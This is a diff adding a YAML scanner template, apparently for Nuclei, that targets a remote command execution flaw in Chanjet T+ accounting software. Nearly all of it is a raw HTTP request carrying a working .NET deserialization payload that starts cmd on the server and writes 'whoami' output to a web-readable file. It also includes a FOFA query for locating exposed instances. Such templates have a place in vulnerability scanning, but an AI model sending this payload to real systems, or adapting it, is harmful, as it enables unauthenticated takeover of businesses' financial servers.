@@ -1,0 +1,19 @@
+id: poc-gflqbsgp0g92w072
+info:
+  name: 畅捷通 T+ 前台远程命令执行漏洞 QVD-2023-13615
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gflqbsgp0g92w072'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gflqbsgp0g92w072
+    fofa: app="畅捷通-TPlus"
+http:
+- raw:
+  - "POST /tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStore HTTP/1.1\n\nAccept-Encoding: gzip, deflate\n\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\nConnection: close\n\nX-Ajaxpro-Method: GetStoreWarehouseByStore\n\nContent-Type: application/x-www-form-urlencoded\n\n\n\n{\n\n  \"storeID\":{\n\n    \"__type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\",\n\n    \"MethodName\":\"Start\",\n\n    \"ObjectInstance\":{\n\n      \"__type\":\"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n\n      \"StartInfo\":{\n\n        \"__type\":\"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089\",\n\n        \"FileName\":\"cmd\",\n\n        \"Arguments\":\"/c whoami > dudesite.txt\"\n\n      }\n\n    }\n\n  }\n\n}\n\n# 响应代码特征\n200\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n/tplus/dudesite.txt"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
